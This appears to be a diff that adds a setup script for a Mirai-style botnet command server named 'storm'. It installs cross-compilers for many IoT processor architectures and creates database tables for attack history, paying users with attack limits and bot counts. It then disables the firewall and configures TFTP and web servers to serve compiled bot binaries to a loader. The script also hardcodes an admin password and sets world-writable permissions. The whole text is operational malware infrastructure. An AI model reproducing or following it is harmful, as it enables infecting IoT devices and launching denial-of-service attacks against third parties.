@@ -1,0 +1,173 @@
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+yum install gcc glibc-static gcc-c++ -y
+ mkdir /etc/xcompile
+ cd /etc/xcompile
+ 
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+ wget http://ftp.uni-stuttgart.de/pub/mirrors/mirror.slitaz.org/slitaz/sources/packages-stable/c/cross-compiler-armv6l.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
+ wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+ wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv5l.tar.bz2
+ wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips64.tar.bz2
+ wget http://www.godz-soldiers.xyz/downloads/cross-compiler-sh2elf.tar.gz
+ wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+tar -jxvf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
+export PATH=$PATH:/etc/xcompile/arc/bin
+ tar -jxvf cross-compiler-armv4l.tar.bz2
+ tar -jxvf cross-compiler-armv7l.tar.bz2
+ tar -jxvf cross-compiler-armv5l.tar.bz2
+ tar -jxvf cross-compiler-i586.tar.bz2
+ tar -jxvf cross-compiler-i686.tar.bz2
+ tar -jxvf cross-compiler-m68k.tar.bz2
+ tar -jxvf cross-compiler-mips.tar.bz2
+ tar -jxvf cross-compiler-mipsel.tar.bz2
+ tar -jxvf cross-compiler-powerpc.tar.bz2
+ tar -jxvf cross-compiler-sh4.tar.bz2
+ tar -jxvf cross-compiler-sparc.tar.bz2
+ tar -jxvf cross-compiler-armv6l.tar.bz2
+ tar -jxvf cross-compiler-mips64.tar.bz2
+ tar -jxvf cross-compiler-sh2elf.tar.gz
+ 
+ rm -rf *.tar.bz2
+ mv cross-compiler-armv4l armv4l
+ mv cross-compiler-armv7l armv7l
+ mv cross-compiler-i586 i586
+ mv cross-compiler-i686 i686
+ mv cross-compiler-armv5l armv5l
+ mv cross-compiler-m68k m68k
+ mv cross-compiler-mips mips
+ mv cross-compiler-mips64 mips64
+ mv cross-compiler-mipsel mipsel
+ mv cross-compiler-powerpc powerpc
+ mv cross-compiler-sh4 sh4
+ mv cross-compiler-sparc sparc
+ mv cross-compiler-armv6l armv6l
+ mv cross-compiler-sh2elf elf
+
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/i686/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mips64/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/elf/bin
+
+export PATH=$PATH:/usr/local/go/bin
+export GOPATH=$HOME/Documents/go
+
+
+cd /tmp
+wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
+tar -xzf go1.9.4.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+ go get github.com/go-sql-driver/mysql
+ go get github.com/mattn/go-shellwords
+
+ 
+service mysqld restart
+mysql_secure_installation
+mysql -u root -p
+
+
+CREATE DATABASE storm;
+use storm;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'faraday', 'admin123', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+
+ulimit -n 999999
+service iptables stop 
+service httpd restart  
+service mysqld restart
+chmod 777 /var/www/html/*
+chmod 777 /var/www/html/bins/*
+mkdir /var/lib/
+chmod 777 /var/lib/tftpboot/*
+
+rm -rf /etc/xinetd.d/tftp
+
+echo "service tftp
+{
+        disable                 = no
+        socket_type             = dgram
+        protocol                = udp
+        wait                    = yes
+        user                    = root
+        server                  = /usr/sbin/in.tftpd
+        server_args             = -s /var/lib/tftpboot
+        per_source              = 11
+        cps                     = 100 2
+        flags                   = IPv4
+}
+" > /etc/xinetd.d/tftp
+
+service xinetd restart
+service xinetd restart
+
+
+dlr/release to /root/loader/bins
+./build.sh
+then
+/root/release
+to
+/var/www/html/bins
